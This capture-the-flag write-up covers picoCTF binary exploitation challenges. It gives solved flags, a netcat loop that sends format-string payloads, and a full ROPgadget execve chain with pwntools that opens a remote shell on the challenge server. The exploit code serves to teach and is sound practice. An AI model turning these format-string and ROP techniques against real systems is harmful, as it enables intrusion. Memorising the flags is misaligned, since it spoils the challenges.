# flag leak

**Flag:** `picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}`

So i started by understanding the code and saw that the code was taking an input from us and just printing it back but with no format specifiers this made it vulnerable. We could append our own format specifiers (such as %x, %n, %p) in the input and this would let us read or write in the memory, also the code was reading the flag and storing in the memory stack so basically we just needed to traverse the memory stack to find the stored and flag and get it. I did this by running a loop using `%i$s` which basically printed the stored strings at index i of the memory stack by writing a shell script
```
for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 60315; done
```
this printed alot of values and one of them was the flag!!!

# buffer overflow 0

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}`

I got the source code file so i read it and it was written that max flag size was 64 so i just entered a value way more than 64 and it overflowed and i got the flag!!!

# format string 0

**Flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}`

Started the challenge and read the source code, didnt find anything special, now ran the challenge and it asked for us to enter the dish name now there were 3 options i entered the one which contained format specifiers (%s,d,f,etc) since challenge name is format string and it worked then again it asked for another name i again followed the same rule and got the flag!!! After solving it by luck i tried understanding why this worked so basically the condition the code was checking is that the entered answer should be greater than 64 in size but the options given were 
```
Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
```
None of these are greater than 64 but when code encounters "%114d" in "Gr%114d_Cheese" it reads it as a format specifier and expects to prints a 114 integer value there but since we havent given any value it replaces it with garbage values thus satisfying the conditon, now for the second case it asked for something that could crash the code and the options were
```
Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
```
So i enetred "Cla%sic_Che%s%steak" since it had "%s" in it which is another format specifier and we didnt give it any value so i felt that it could lead to error and crashing the site and thus i got the flag!!! ("Pe%to_Portobello" wont work since %t is not a format specifier)

# format string 1

**Flag:** `picoCTF{4n1m41_57y13_4x4_f14g_64277116}`

Started the challenge and read through the code and saw that there was no format specifier in the print statement so i was able to traverse the memeory stack by using "%x" and "%p" and got all the hex values and on decoding it i got the flag but reversed so i corrected it and got the final flag!!!

# ropfu

**Flag:** `picoCTF{5n47ch_7h3_5h311_4c812975}`

One of the harder challenges i have done and took alot of researching and learing only to find out there are tools built to solve these type of things. Started the challenge by downloading the given files, the program and its source code along with the hint this had something to do with ROP (Return Oriented Programming) so i googled about it and asked chatGPT to find how to solve these type of challenges, the source code shows the vulnerability in `gets()`
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);


  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();

}
```
the first step was to use 
```
checksec vuln
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
here we observe that canary is found so it helps prevent direct buffer overflow by restricting it, also NX is disabled so we could exploit that so i started researching again and after a long time i found out i could use a tool `ROPgadget` to get the ROP chain to solve this challenge by using sycall and getting the shell, I just needed to figure out the padding required intially to overwrite the retrun address, so i did that by using gdb and GEF with the help of chatGPT
```
gdb ./vuln
gef➤ pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
gef➤ run <<< aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
gef➤ info registers eip
eip            0x61616168          0x61616168
gef➤ pattern search 0x61616168
[+] Searching for '68616161'/'61616168' with period=4
[+] Found at offset 28 (little-endian search) likely
```
here we see that offset is of 28 also we searched eip because when the program crashes due to a buffer overflow (because of the gets() call), the eip register will hold the address that was overwritten during the overflow, now with the padding known i used 
```
ROPgadget --binary ./vuln --ropchain
```
to get the required ROP chain
```
#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''

p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
      p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b073a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5064) # @ .data + 4
      p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b073a) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
      p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804fb80) # xor eax, eax ; ret
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x08049e29) # pop ecx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
      p += pack('<I', 0x080e5060) # padding without overwrite ebx
p += pack('<I', 0x0804fb80) # xor eax, eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0804a3c2) # int 0x80
```
now with this i fixed up the final code and ran it
```
#!/usr/bin/env python3
# execve generated by ROPgadget
from pwn import *
from struct import pack

# Padding goes here
p = b'a'*28

p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b073a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5064) # @ .data + 4
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b073a) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804fb80) # xor eax, eax ; ret
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x08049e29) # pop ecx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080e5060) # padding without overwrite ebx
p += pack('<I', 0x0804fb80) # xor eax, eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0804a3c2) # int 0x80

co = remote('saturn.picoctf.net',61588)
print (co.recv(1000))
co.send(p)
co.interactive()
co.close()
```
and got the output
```
[+] Opening connection to saturn.picoctf.net on port 61588: Done
b'How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n'
[*] Switching to interactive mode
$ ls
$ ls -al
total 700
drwxr-xr-x 1 root root     34 Aug  4  2023 .
drwxr-xr-x 1 root root    104 Aug  4  2023 ..
-rw-r--r-- 1 root root     34 Aug  4  2023 flag.txt
-rwxr-xr-x 1 root root 709360 Aug  4  2023 vuln
$ cat flag.txt
picoCTF{5n47ch_7h3_5h311_4c812975}$
$
[*] Interrupted
[*] Closed connection to saturn.picoctf.net port 61588
```
and thus i got the flag!!!

- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
- [What is ROP](https://ctf101.org/binary-exploitation/return-oriented-programming/)
